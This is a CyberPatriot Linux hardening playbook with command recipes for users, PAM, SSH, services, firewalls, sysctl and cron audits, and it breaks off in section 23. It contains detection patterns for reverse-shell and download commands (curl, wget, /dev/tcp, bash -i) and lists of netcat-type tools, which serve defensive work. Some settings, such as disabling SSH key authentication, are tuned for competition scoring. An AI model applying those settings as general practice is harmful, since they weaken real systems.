# CyberPatriot Linux Playbook

Round procedure for Linux images. Distro-agnostic (Debian/Ubuntu/Mint, RHEL/Fedora/Rocky/Alma, openSUSE, Arch). Companion to `cp_audit.sh`.

**Prime directive:** the README on the desktop is authoritative. Do not remove required software, stop required services, or delete authorized users. The single fastest way to lose points is breaking something the scoring engine expected to find.

---

## Contents

1. [Pre-round](#1-pre-round)
2. [First 5 minutes](#2-first-5-minutes)
3. [Identify the distro](#3-identify-the-distro)
4. [Preserve evidence](#4-preserve-evidence)
5. [Forensics Questions](#5-forensics-questions)
6. [Baseline audit](#6-baseline-audit)
7. [Users and accounts](#7-users-and-accounts)
8. [Sudoers and privilege](#8-sudoers-and-privilege)
9. [Passwords and aging](#9-passwords-and-aging)
10. [PAM hardening](#10-pam-hardening)
11. [Login policy (login.defs)](#11-login-policy-logindefs)
12. [GUI quick wins](#12-gui-quick-wins)
13. [Prohibited software](#13-prohibited-software)
14. [Prohibited files](#14-prohibited-files)
15. [Services and listening sockets](#15-services-and-listening-sockets)
16. [Firewall](#16-firewall)
17. [SSH hardening](#17-ssh-hardening)
18. [Critical service hardening](#18-critical-service-hardening)
19. [Sysctl and kernel tunables](#19-sysctl-and-kernel-tunables)
20. [Critical file permissions](#20-critical-file-permissions)
21. [SUID, SGID, world-writable, orphans](#21-suid-sgid-world-writable-orphans)
22. [Scheduled tasks](#22-scheduled-tasks)
23. [Network configuration files](#23-network-configuration-files)
24. [Boot and startup](#24-boot-and-startup)
25. [Kernel modules / hardware](#25-kernel-modules--hardware)
26. [Backdoor and rootkit hunting](#26-backdoor-and-rootkit-hunting)
27. [Advanced persistence mechanisms](#27-advanced-persistence-mechanisms)
28. [Container security (Docker)](#28-container-security-docker)
29. [Web persistence and database users](#29-web-persistence-and-database-users)
30. [Browser hardening](#30-browser-hardening)
31. [Updates](#31-updates)
32. [Final pass](#32-final-pass)
33. [Penalties to avoid](#33-penalties-to-avoid)
34. [Command reference](#34-command-reference)
35. [Suggested timeline](#35-suggested-timeline)

---

## 1. Pre-round

- This playbook open on a second device.
- `cp_audit.sh` ready to copy onto the image.
- Know how to open a terminal (`Ctrl+Alt+T` or applications grid → Terminal).
- Practice on every public image you can find (Bloons TD 6, Mr. Robot, Money Heist, etc.) before competition.

**Terminology:**

| Term | Meaning |
|---|---|
| `sudo` | Run as administrator. Prompts for password. |
| README | Desktop file listing authorized users, admins, required software, tasks. |
| Vulnerability | Scored fix. |
| Penalty | Negative scored regression. |
| FQ (Forensics Question) | Desktop text file. Write the answer in the file and save. |
| Critical service | Service the README requires; do not stop or remove. |
| Required software | Package the README requires; do not uninstall. |

---

## 2. First 5 minutes

1. Log in with the credentials from the scoring screen.
2. Open the README on the desktop. Read it fully.
3. Screenshot or duplicate the README window.
4. Locate every Forensics Question file on the desktop.
5. Do not modify the system yet — FQs come first.

The README defines:
- Authorized users (everyone else: delete)
- Authorized administrators (subset of users; everyone else: demote)
- Required software (do not remove)
- Critical services (do not stop)
- Additional tasks (e.g., "add user X to group Y", "set password to Z")

---

## 3. Identify the distro

```bash
cat /etc/os-release
```

| `ID=` | Family | Package manager | Admin group |
|---|---|---|---|
| `ubuntu`, `debian`, `linuxmint`, `kali`, `pop` | Debian | `apt` | `sudo` |
| `fedora`, `rhel`, `centos`, `rocky`, `almalinux` | RHEL | `dnf` (or `yum`) | `wheel` |
| `opensuse-leap`, `opensuse-tumbleweed`, `sles` | SUSE | `zypper` | `wheel` |
| `arch`, `manjaro`, `endeavouros` | Arch | `pacman` | `wheel` |

The audit script auto-detects this. You need it for manual commands.

---

## 4. Preserve evidence

Snapshot logs and shell histories before any changes. The scoring engine never asks for these, but FQs sometimes do, and you'll want them if you have to debug a regression.

```bash
sudo ./cp_audit.sh --preserve-logs
```

This copies `/var/log/auth.log`, `/var/log/syslog`, `/var/log/dpkg.log`, all root and user `.bash_history` files, current process tree, listening sockets, and `who`/`last` output to `/var/log/cp_audit/snapshot-<timestamp>/`.

Manual equivalent:
```bash
sudo cp -a /var/log/auth.log /var/log/syslog /var/log/dpkg.log ~/snapshot/
sudo cp -a /root/.bash_history ~/snapshot/root.bash_history
sudo ps -ef > ~/snapshot/ps.txt
sudo ss -tulnp > ~/snapshot/ss.txt
```

---

## 5. Forensics Questions

FQs are scored independently and often depend on the unmodified system state. **Complete them before hardening.**

Locate FQ files:
```bash
ls /home/*/Desktop/ /root/Desktop/ 2>/dev/null | grep -iE 'forensic|fq'
```

Common patterns:

| Question | Command |
|---|---|
| Decode base64 | `echo "<text>" \| base64 -d` |
| Decode rot13 | `echo "<text>" \| tr 'A-Za-z' 'N-ZA-Mn-za-m'` |
| Find file by name | `sudo find / -name "<n>" 2>/dev/null` |
| Find by extension | `sudo find / -iname "*.mp3" 2>/dev/null` |
| Find by user | `sudo find / -user <user> 2>/dev/null` |
| Recently modified | `sudo find / -mtime -7 2>/dev/null` |
| User UID | `id <user>` |
| User home | `getent passwd <user> \| cut -d: -f6` |
| User shell | `getent passwd <user> \| cut -d: -f7` |
| User groups | `id <user>` |
| SSH port | `grep -i ^Port /etc/ssh/sshd_config` |
| SUID binaries | `find / -perm -4000 2>/dev/null` |
| File capabilities | `getcap -r / 2>/dev/null` |
| File contents | `cat /path/to/file` |
| File hash | `sha256sum /path/to/file` |
| Strings in binary | `strings /path/to/binary \| less` |
| Failed logins | `sudo lastb` or `sudo grep "Failed" /var/log/auth.log` |
| Last logins | `last` |
| Cron jobs | `crontab -l -u <user>` and `cat /etc/crontab` |
| Service unit file | `systemctl cat <service>` |
| Process info | `ps -ef \| grep <name>` |
| Listening ports | `sudo ss -tulnp` |
| Open files of a process | `sudo lsof -p <pid>` |
| Package install date | `grep <pkg> /var/log/dpkg.log` |
| Author / creator | "Think about who made this" — read the README header |

Write the answer after `ANSWER:` exactly as specified. No quotes, no trailing punctuation, absolute paths starting with `/`. Save the file. Verify with `cat` after.

---

## 6. Baseline audit

```bash
chmod +x cp_audit.sh
sudo ./cp_audit.sh | tee audit-before.txt
```

Output legend: **OK** (green), **WARN** (yellow), **BAD** (red), **INFO** (blue, lists for manual review). The script ends with a summary count.

The audit covers everything in sections 7–27 of this playbook. Read it once before making changes; it gives you the lay of the land.

Cross-reference every BAD finding with the README before fixing. Some defaults (Samba, nginx, Wireshark) may be required.

---

## 7. Users and accounts

**Before anything: check for immutable bits.** Attackers run `chattr +i` on `/etc/passwd`, `/etc/shadow`, and `/etc/group` so you cannot edit user files. If `userdel` fails with "permission denied" even as root, this is why.

```bash
sudo lsattr /etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/sudoers
# If any line shows ----i--------- the immutable bit is set
sudo chattr -i /etc/passwd /etc/shadow /etc/group /etc/gshadow
```

Also check for a cron script that re-applies the immutable bit:
```bash
sudo grep -r 'chattr' /etc/cron* /var/spool/cron 2>/dev/null
```
Remove any malicious script before continuing.

**List human accounts:**
```bash
awk -F: '$3>=1000 && $3<60000 {print $1}' /etc/passwd
```

**Compare against README. Then:**

| Action | Debian | RHEL/SUSE/Arch |
|---|---|---|
| Delete user (with home) | `sudo deluser --remove-home <user>` | `sudo userdel -r <user>` |
| Add user | `sudo adduser <user>` | `sudo useradd -m <user> && sudo passwd <user>` |
| Add to group | `sudo gpasswd -a <user> <group>` | `sudo gpasswd -a <user> <group>` |
| Remove from group | `sudo gpasswd -d <user> <group>` | `sudo gpasswd -d <user> <group>` |

**Other user checks:**

```bash
# UID 0 accounts (only root expected)
awk -F: '$3==0 {print $1}' /etc/passwd

# Hidden / disguised usernames (start with . or contain whitespace)
awk -F: '$1 ~ /^[.\-_]/ || $1 ~ /[[:space:]]/' /etc/passwd

# Duplicate UIDs
awk -F: '{print $3}' /etc/passwd | sort | uniq -d

# Empty passwords
sudo awk -F: '$2 == "" {print $1}' /etc/shadow

# Service accounts with login shells (suspicious)
awk -F: '$3<1000 && $3>0 && $7 ~ /(bash|sh|zsh|ksh)$/ {print $1, $7}' /etc/passwd

# Service accounts: set their shell to nologin
sudo usermod -s /usr/sbin/nologin <service-account>

# Members of docker group (effectively root)
getent group docker
# Members of lxd group (also effectively root)
getent group lxd
```

The `docker` and `lxd` groups give container escape paths to root. Remove unauthorized members:
```bash
sudo gpasswd -d <user> docker
```

**Lock the root account** (SSH should already be `PermitRootLogin no`, but lock the password too):
```bash
sudo passwd -l root
```

**Constraints:**
- Never delete users in the README.
- Never delete `root` or any UID < 1000.
- Verify with `getent passwd <user>` after each change.
- If you accidentally delete a user, recreate them immediately with the same name.

---

## 8. Sudoers and privilege

**List administrators:**
```bash
getent group sudo     # Debian family
getent group wheel    # RHEL/SUSE/Arch
getent group admin    # legacy Ubuntu
getent group adm      # log readers (often considered admin)
```

**Demote / promote:**

| Action | Debian | RHEL/SUSE/Arch |
|---|---|---|
| Demote | `sudo gpasswd -d <user> sudo` | `sudo gpasswd -d <user> wheel` |
| Promote | `sudo usermod -aG sudo <user>` | `sudo usermod -aG wheel <user>` |

Also remove from `adm`, `lpadmin`, `sambashare` if the user is no longer an admin.

**Audit `/etc/sudoers` and `/etc/sudoers.d/`:**

```bash
# Look for NOPASSWD and !authenticate
sudo grep -RIn 'NOPASSWD\|!authenticate' /etc/sudoers /etc/sudoers.d/

# LD_PRELOAD must not survive sudo
sudo grep -RIn 'Defaults.*env_keep.*LD_PRELOAD' /etc/sudoers /etc/sudoers.d/

# Disable coredumps for sudo explicitly
sudo grep -RIn 'Defaults.*disable_coredump' /etc/sudoers /etc/sudoers.d/

# List sudoers.d files (anything besides README is suspicious)
sudo ls -la /etc/sudoers.d/

# Validate syntax (always run after editing)
sudo visudo -c
```

**Edit sudoers safely** — never directly:
```bash
sudo visudo                # main file
sudo visudo -f /etc/sudoers.d/<file>
```

Remove `NOPASSWD` lines, `!authenticate` lines, any `env_keep += "LD_PRELOAD"` lines, and any unrecognized files in `/etc/sudoers.d/`.

If `disable_coredump` is missing, add:
```bash
Defaults disable_coredump
```

---

## 9. Passwords and aging

**Set a password:**
```bash
sudo passwd <user>
```

**Force change on next login:**
```bash
sudo passwd -e <user>
```

**Set password aging on a user:**
```bash
sudo chage -M 90 -m 7 -W 14 <user>
# -M max days  -m min days  -W warn days
```

**Lock an account:**
```bash
sudo passwd -l <user>
```

Strong password: 12+ characters, mixed case, numbers, symbols. Do not change your own password unless the README requires it. The README often gives a default password to use for all accounts — use that.

---

## 10. PAM hardening

PAM is configured in `/etc/pam.d/`. Files differ by distro.

| File | Debian | RHEL/SUSE |
|---|---|---|
| Auth | `/etc/pam.d/common-auth` | `/etc/pam.d/system-auth`, `/etc/pam.d/password-auth` |
| Password | `/etc/pam.d/common-password` | same |

**Backdoor first.** Before adding hardening, check for backdoors. The classic attack swaps `pam_deny.so` for `pam_permit.so` so any password works:

```bash
sudo grep -rn 'pam_permit' /etc/pam.d/
sudo grep -rn 'nullok' /etc/pam.d/
```

`pam_permit` in an `auth` line is almost always malicious. See section 27 for full details.

**Account lockout** (5 failed attempts → 30-min lock). Add to the auth file:

```
# Modern (RHEL 8+, recent Debian/Ubuntu):
auth required pam_faillock.so preauth silent deny=5 unlock_time=1800
auth [success=1 default=bad] pam_unix.so
auth [default=die] pam_faillock.so authfail deny=5 unlock_time=1800
auth sufficient pam_faillock.so authsucc deny=5 unlock_time=1800

# Older (deprecated but still works on older images):
auth required pam_tally2.so deny=5 onerr=fail unlock_time=1800
```

Check current lockouts:
```bash
sudo faillock           # modern
sudo pam_tally2 --user <user>  # older
```

**Password complexity.** Add to the password file:

```
password requisite pam_pwquality.so retry=3 minlen=12 difok=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 reject_username
```

Or on older Debian:
```bash
sudo apt install -y libpam-cracklib
# then in /etc/pam.d/common-password:
password requisite pam_cracklib.so retry=3 minlen=12 difok=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1
```

`-1` means require at least 1 of that character class.

**Password history** (prevent reuse). Add to password file:
```
password required pam_pwhistory.so remember=24 use_authtok
```

Or modify the existing `pam_unix.so` line:
```
password [success=1 default=ignore] pam_unix.so obscure use_authtok try_first_pass yescrypt remember=5 minlen=12
```

**Centralized config** (modern systems): `/etc/security/pwquality.conf`
```
minlen = 12
dcredit = -1
ucredit = -1
ocredit = -1
lcredit = -1
difok = 3
retry = 3
```

---

## 11. Login policy (login.defs)

Edit `/etc/login.defs`:

```
UMASK             077
PASS_MAX_DAYS     90
PASS_MIN_DAYS     7
PASS_WARN_AGE     14
FAILLOG_ENAB      yes
LOG_OK_LOGINS     yes
LOG_UNKFAIL_ENAB  yes
SYSLOG_SU_ENAB    yes
SYSLOG_SG_ENAB    yes
ENCRYPT_METHOD    YESCRYPT
```

These set defaults for new users. They do not retroactively apply to existing users — use `chage` for those.

---

## 12. GUI quick wins

Grab these before going deep into the terminal. Each takes about 60 seconds and is almost always scored.

**Software & Updates** (Debian-family GUI; Discover on KDE; GNOME Software on GNOME):
- Updates tab → Automatically check for updates → **Daily**
- Enable security updates
- Enable recommended updates if listed

**Settings → Users:** verify list matches README. Toggle "Administrator" off for non-admins (or use the terminal commands above).

**Display manager / login screen:**
- Disable guest login
- Disable autologin
- Hide the user list on the greeter when possible
- Do not allow root login from the greeter

Common checks:
```bash
grep -RInE 'allow-guest=false|autologin-user=none|greeter-hide-users=true|greeter-show-manual-login=true' /etc/lightdm 2>/dev/null
grep -RInE 'disable-user-list[[:space:]]*=[[:space:]]*true|allowroot|greeter-allow-root' /etc/gdm /etc/gdm3 2>/dev/null
```

**Firefox → Settings → Privacy & Security:**
- Block dangerous and deceptive content: ON (and all sub-checks)
- Block dangerous downloads: ON
- Warn about uncommon software: ON
- HTTPS-Only Mode: Enable in all windows
- Enhanced Tracking Protection: Strict
- Send websites a Do Not Track signal: ON
- Clear cookies and site data when Firefox is closed: ON
- Set Primary Password: yes
- Saved Logins: review and remove unauthorized entries
- Confirm the HTTPS-only pref is actually set if you need to verify on disk:
```bash
grep -R 'dom.security.https_only_mode' /root/.mozilla/firefox /home/*/.mozilla/firefox 2>/dev/null
```

**Firefox → General:**
- Set as default browser
- Always check for updates

**Chromium / Chrome:**
- Safe Browsing: Enhanced protection
- Clear browsing data on exit

---

## 13. Prohibited software

**Always check the README first.** Common prohibited packages:

| Category | Packages |
|---|---|
| Password crackers | `ophcrack`, `john`, `hydra`, `hashcat`, `fcrackzip`, `lcrack`, `pdfcrack`, `rarcrack`, `sipcrack`, `medusa` |
| Network attack | `nmap`, `zenmap`, `wireshark`, `tshark`, `tcpdump`, `ettercap`, `nikto`, `sqlmap` |
| WiFi attacks | `aircrack-ng`, `weplab`, `pyrit` |
| Backdoor / shell | `netcat`, `ncat`, `socat`, `pnetcat` |
| Insecure servers | `vsftpd`, `proftpd`, `pure-ftpd`, `telnetd`, `rsh-server`, `talk`, `talkd` |
| Super-server | `inetd`, `openbsd-inetd`, `xinetd` |
| File sharing | `samba` (only if not required), `nfs-kernel-server`, `rpcbind` |
| Web servers | `nginx`, `apache2`/`httpd`, `lighttpd` (only if not required) |
| Mail | `postfix`, `sendmail`, `exim4`, `dovecot` (only if not required) |
| DNS | `bind9` (only if not required) |
| SNMP | `snmpd` |
| Remote desktop | `vnc4server`, `tightvncserver`, `x11vnc`, `vino` |
| P2P | `frostwire`, `vuze`, `azureus`, `deluge`, `transmission`, `qbittorrent` |
| Keyloggers | `logkeys` |
| Privacy / tracking | `zeitgeist`, `zeitgeist-core` |
| Games | `nethack`, `aisleriot`, `gnome-mahjongg` |
| Explicitly prohibited on some images | `pvpgn`, `sucrack`, `changeme`, `unworkable` |

**List installed packages:**

| Family | Command |
|---|---|
| Debian | `dpkg-query -W -f='${binary:Package}\n' \| sort` |
| RHEL/SUSE | `rpm -qa \| sort` |
| Arch | `pacman -Qq \| sort` |

**Filter for suspicious patterns:**
```bash
# Debian
dpkg -l | grep -iE 'crack|hack|nmap|john|hydra' | grep -viE 'libcrack|cracklib'
# RHEL/SUSE
rpm -qa | grep -iE 'crack|hack|nmap|john|hydra' | grep -viE 'libcrack|cracklib'
```

**Remove a package:**

| Family | Command |
|---|---|
| Debian | `sudo apt purge -y <pkg> && sudo apt autoremove -y` |
| RHEL (dnf) | `sudo dnf remove -y <pkg>` |
| RHEL (yum) | `sudo yum remove -y <pkg>` |
| SUSE | `sudo zypper --non-interactive remove <pkg>` |
| Arch | `sudo pacman -Rns --noconfirm <pkg>` |

---

## 14. Prohibited files

**Find media files (full filesystem):**
```bash
sudo find / -xdev -type f \( \
  -iname '*.mp3' -o -iname '*.mp4' -o -iname '*.mkv' -o -iname '*.avi' \
  -o -iname '*.flac' -o -iname '*.wav' -o -iname '*.mov' -o -iname '*.wmv' \
  -o -iname '*.flv' -o -iname '*.m4v' -o -iname '*.webm' -o -iname '*.ogg' \
  -o -iname '*.aac' -o -iname '*.m4a' \) 2>/dev/null
```

**Find downloads in user homes:**
```bash
sudo find /home /root -type f \( \
  -iname '*.tar.gz' -o -iname '*.tgz' -o -iname '*.zip' -o -iname '*.rar' \
  -o -iname '*.deb' -o -iname '*.rpm' -o -iname '*.iso' \) 2>/dev/null
```

**Find suspicious filenames:**
```bash
sudo find /home /root -type f \( \
  -iname 'wordlist*' -o -iname 'passwords*' -o -iname 'rockyou*' \
  -o -iname 'shadow*' -o -iname 'crack*' -o -iname 'hash*' \) 2>/dev/null
```

**Find files modified recently** (often malware/backdoors):
```bash
sudo find / -mtime -7 -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
```

**Delete with confirmation:**
```bash
sudo rm -i /path/to/file
```

Restrict deletions to obviously non-work content under `/home` and `/tmp`. Do not touch `/etc`, `/usr`, `/var`, `/bin`, `/sbin` unless you're sure. False-positive media files in `libreoffice/share/gallery/sounds/` and `python/scipy/io/tests/data/` are NOT prohibited.

---

## 15. Services and listening sockets

**List active services:**
```bash
systemctl list-units --type=service --state=active
```

**List listening sockets (with process names):**
```bash
sudo ss -tulnp
```

**Anything listening that isn't in the README is a vulnerability.** Compare against the required services list.

**Disable a service:**
```bash
sudo systemctl disable --now <service>
```

`disable --now` stops it now AND prevents it on next boot.

**Critical services — never stop without README confirmation:**
- `ssh`/`sshd`
- `NetworkManager`/`systemd-networkd`
- `systemd-*`
- `dbus`
- `cron`/`crond`
- `rsyslog`/`syslog-ng`/`systemd-journald`
- `polkit`
- `udev`/`systemd-udevd`
- `accounts-daemon`

**Hunt for backdoor processes:**
```bash
ps -ef | grep -E '\b(nc|ncat|netcat|socat)\b' | grep -v grep
sudo lsof -i -P -n | grep LISTEN
```

If you find a netcat listener:
```bash
sudo ss -tulnp | grep LISTEN     # find the PID
sudo kill -9 <pid>
sudo find / -name 'nc' -o -name 'ncat' -o -name 'netcat' 2>/dev/null
sudo apt purge -y netcat netcat-traditional netcat-openbsd ncat
```

Then check cron/systemd for what restarted it.

---

## 16. Firewall

**Use whichever the distro ships with.**

| Family | Default firewall | Enable |
|---|---|---|
| Debian | UFW | `sudo apt install -y ufw && sudo ufw enable` |
| RHEL/SUSE | firewalld | `sudo systemctl enable --now firewalld` |
| Arch | nftables | `sudo systemctl enable --now nftables` |

**UFW basics:**
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow OpenSSH               # or: sudo ufw allow 22/tcp
sudo ufw enable
sudo systemctl enable ufw
sudo ufw status verbose
sudo ufw logging on
```

`ufw status verbose` should show both `Status: active` and `Logging: on`.

**firewalld basics:**
```bash
sudo firewall-cmd --get-default-zone
sudo firewall-cmd --list-all
sudo firewall-cmd --permanent --add-service=ssh
sudo firewall-cmd --permanent --remove-service=telnet
sudo firewall-cmd --reload
```

**Block specific dangerous ports** (telnet, NFS, X11, printer, RPC):
```bash
sudo ufw deny 23     # telnet
sudo ufw deny 2049   # NFS
sudo ufw deny 111    # RPC/portmap
sudo ufw deny 515    # printer
sudo ufw deny 6000:6009/tcp  # X11
```

### AppArmor

If the image uses AppArmor, it should be both enabled and running:
```bash
systemctl is-enabled apparmor
systemctl is-active apparmor
aa-status
```

---

## 17. SSH hardening

Edit `/etc/ssh/sshd_config`:

```
PermitRootLogin no
PermitEmptyPasswords no
PubkeyAuthentication no
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding no
MaxAuthTries 4
MaxSessions 2
MaxStartups 10:30:60
ClientAliveInterval 300
ClientAliveCountMax 0
LoginGraceTime 60
IgnoreRhosts yes
HostbasedAuthentication no
PermitUserEnvironment no
AllowTcpForwarding no
AllowAgentForwarding no
TCPKeepAlive no
Compression no
UseDNS no
LogLevel VERBOSE
StrictModes yes
PrintLastLog yes
Banner /etc/issue.net
Protocol 2
```

For scored images that require key-based auth to be disabled, leave `AcceptEnv` unset or remove all active `AcceptEnv` lines entirely. An empty `AcceptEnv` line is not useful; the safest state is no active directive.

Verify there are no active `AcceptEnv` lines:
```bash
grep -iE '^[[:space:]]*AcceptEnv[[:space:]]' /etc/ssh/sshd_config
```

**Restrict to specific users:**
```
AllowUsers alice bob
```

**Validate before reloading** (a syntax error can lock you out):
```bash
sudo sshd -t
sudo systemctl reload sshd
```

Test from a second terminal before closing your current SSH session.

---

## 18. Critical service hardening

Only fix services the README requires. Otherwise, remove them.

### Apache / httpd

Edit `/etc/apache2/conf-enabled/security.conf` (Debian) or `/etc/httpd/conf/httpd.conf` (RHEL):

```
ServerTokens Prod
ServerSignature Off
TraceEnable Off
<Directory />
    Options -Indexes
    AllowOverride None
    Require all denied
</Directory>
UserDir disabled root
```

```bash
sudo apachectl configtest
sudo systemctl reload apache2     # or httpd
```

### nginx

Edit `/etc/nginx/nginx.conf`:

```
server_tokens off;
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
add_header X-XSS-Protection "1; mode=block";
client_max_body_size 1m;
```

```bash
sudo nginx -t
sudo systemctl reload nginx
```

### MySQL / MariaDB

Run the secure installer:
```bash
sudo mysql_secure_installation
```

This sets the root password, removes anonymous users, disallows remote root, removes the test database.

Then edit `/etc/mysql/my.cnf` (or `/etc/my.cnf`):
```
[mysqld]
bind-address = 127.0.0.1
local-infile = 0
skip-show-database
```

```bash
sudo systemctl restart mysql      # or mariadb
```

### vsftpd

Edit `/etc/vsftpd.conf`:
```
anonymous_enable=NO
anon_upload_enable=NO
anon_mkdir_write_enable=NO
chroot_local_user=YES
ssl_enable=YES
allow_writeable_chroot=NO
local_umask=077
```

```bash
sudo systemctl restart vsftpd
```

### Samba

Edit `/etc/samba/smb.conf`:
```
[global]
   restrict anonymous = 2
   server signing = mandatory
   client signing = mandatory
   smb encrypt = required
   guest account = nobody
   map to guest = never
   encrypt passwords = yes
```

For each share:
```
read only = yes
guest ok = no
```

```bash
sudo testparm
sudo systemctl restart smbd
```

### PHP

Edit `/etc/php/<version>/apache2/php.ini` (or wherever):
```
expose_php = Off
allow_url_fopen = Off
allow_url_include = Off
display_errors = Off
log_errors = On
disable_functions = exec,shell_exec,passthru,system,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,proc_open,pcntl_exec
upload_max_filesize = 2M
max_execution_time = 30
max_input_time = 60
session.cookie_httponly = 1
session.cookie_secure = 1
```

### Postfix

Edit `/etc/postfix/main.cf`:
```
inet_interfaces = loopback-only
disable_vrfy_command = yes
smtpd_banner = $myhostname ESMTP
smtpd_helo_required = yes
```

### BIND

Edit `/etc/bind/named.conf.options` (or `/etc/named.conf`):
```
options {
    recursion no;
    allow-query { localhost; };
    version "not disclosed";
};
```

---

## 19. Sysctl and kernel tunables

Create `/etc/sysctl.d/99-hardening.conf`:

```
# IP forwarding (disable unless this is a router)
net.ipv4.ip_forward = 0

# Spoofing protection
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# Ignore ICMP broadcasts and bogus errors
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1

# Disable source routing
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0
net.ipv6.conf.all.accept_source_route = 0
net.ipv6.conf.default.accept_source_route = 0

# Disable redirects
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.default.secure_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv6.conf.all.accept_redirects = 0
net.ipv6.conf.default.accept_redirects = 0

# SYN flood protection
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 2048
net.ipv4.tcp_synack_retries = 2
net.ipv4.tcp_syn_retries = 5

# TIME-WAIT assassination protection
net.ipv4.tcp_rfc1337 = 1

# Disable TCP timestamps (uptime fingerprinting)
net.ipv4.tcp_timestamps = 0

# Log martians
net.ipv4.conf.all.log_martians = 1
net.ipv4.conf.default.log_martians = 1

# Kernel hardening
kernel.randomize_va_space = 2
kernel.kexec_load_disabled = 1
kernel.perf_event_paranoid = 3
kernel.kptr_restrict = 2
kernel.dmesg_restrict = 1
kernel.sysrq = 0
kernel.core_uses_pid = 1
kernel.unprivileged_userns_clone = 0
vm.unprivileged_userfaultfd = 0
fs.suid_dumpable = 0
fs.protected_hardlinks = 1
fs.protected_symlinks = 1
```

Apply:
```bash
sudo sysctl -p /etc/sysctl.d/99-hardening.conf
```

**Disable IPv6 if not needed** (only if README doesn't require it):
```
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1
```

---

## 20. Critical file permissions

The shadow group differs by family.

| File | Mode | Owner | Notes |
|---|---|---|---|
| `/etc/shadow` | 640 | `root:shadow` (Debian) / `root:root` (others) | |
| `/etc/gshadow` | 640 | same as shadow | |
| `/etc/passwd` | 644 | `root:root` | |
| `/etc/group` | 644 | `root:root` | |
| `/etc/ssh/sshd_config` | 600 | `root:root` | |
| `/etc/sudoers` | 440 | `root:root` | Edit with `visudo` only |
| `/etc/securetty` | 600 | `root:root` | |
| `/etc/crontab` | 600 | `root:root` | |
| `/etc/cron.d` | 700 | `root:root` | directory |
| `/etc/cron.{hourly,daily,weekly,monthly}` | 700 | `root:root` | directories |
| `/etc/hosts.allow` | 644 | `root:root` | |
| `/etc/hosts.deny` | 644 | `root:root` | |
| `/boot/grub/grub.cfg` | 600 | `root:root` | |
| `/etc/inetd.conf` | 440 | `root:root` | if present |
| `/etc/xinetd.conf` | 440 | `root:root` | if present |

**Apply:**
```bash
sudo chmod 640 /etc/shadow
sudo chown root:shadow /etc/shadow      # Debian
sudo chown root:root /etc/shadow        # RHEL/SUSE/Arch
sudo chmod 640 /etc/gshadow
sudo chmod 644 /etc/passwd /etc/group
sudo chmod 600 /etc/ssh/sshd_config
sudo chmod 440 /etc/sudoers
sudo chmod 600 /etc/securetty
```

**Home directory permissions** (750 each):
```bash
for u in $(awk -F: '$3>=1000 && $3<60000 {print $1}' /etc/passwd); do
  [ -d "/home/$u" ] && sudo chmod 750 "/home/$u"
done
```

---

## 21. SUID, SGID, world-writable, orphans

**Find SUID binaries:**
```bash
sudo find / -xdev -type f -perm -4000 2>/dev/null
```

**Find SGID binaries:**
```bash
sudo find / -xdev -type f -perm -2000 2>/dev/null
```

Compare against a clean install. Suspicious SUID candidates: text editors (`nano`, `vim`), interpreters (`python`, `perl`, `ruby`), shells (`bash`, `sh`), file utilities (`cp`, `mv`, `tar`, `find`). Remove SUID with:
```bash
sudo chmod u-s /path/to/binary
```

One explicit scored check:
```bash
ls -l "$(command -v date)"
```

The `date` binary should not have the SUID bit set.

**Find world-writable files:**
```bash
sudo find / -xdev -type f -perm -0002 \
  ! -path '/proc/*' ! -path '/sys/*' ! -path '/dev/*' \
  ! -path '/run/*' ! -path '/tmp/*' ! -path '/var/tmp/*' 2>/dev/null
```

**Find world-writable directories without sticky bit:**
```bash
sudo find / -xdev -type d -perm -0002 ! -perm -1000 2>/dev/null
```

Fix: `sudo chmod o-w <file>` or `sudo chmod +t <dir>`.

**Find files with no owner or group:**
```bash
sudo find / \( -nouser -o -nogroup \) ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null
```

Fix: `sudo chown root:root <file>`.

---

## 22. Scheduled tasks

**System cron:**
```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/

# Hunt for common malicious patterns
sudo grep -RInE 'curl|wget|nc |/dev/tcp|base64.*-d|chmod[[:space:]]+4[0-7]{3}|chattr \+i|bash -i|sh -c' \
  /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly \
  /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
```

**User crontabs:**
```bash
sudo ls /var/spool/cron/crontabs/    # Debian
sudo ls /var/spool/cron/             # RHEL/SUSE/Arch
sudo crontab -l                      # current user
for u in $(awk -F: '$3>=1000{print $1}' /etc/passwd); do
  echo "=== $u ==="
  sudo crontab -l -u "$u" 2>/dev/null
done
```

Delete suspicious user crontabs:
```bash
sudo crontab -r -u <user>
```

**Lock down cron:**
```bash
sudo rm -f /etc/cron.deny /etc/at.deny
echo "root" | sudo tee /etc/cron.allow
echo "root" | sudo tee /etc/at.allow
sudo chmod 400 /etc/cron.allow /etc/at.allow
sudo chown root:root /etc/cron.allow /etc/at.allow
```

Only root can use cron / at after this.

**Systemd timers:**
```bash
systemctl list-timers --all
systemctl cat <timer>.timer
```

---

## 23. Network configuration files

### `/etc/hosts`

Should only contain loopback and standard IPv6 entries. Anything else is suspicious.

Default content:
```
127.0.0.1 localhost
127.0.1.1 <hostname>
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
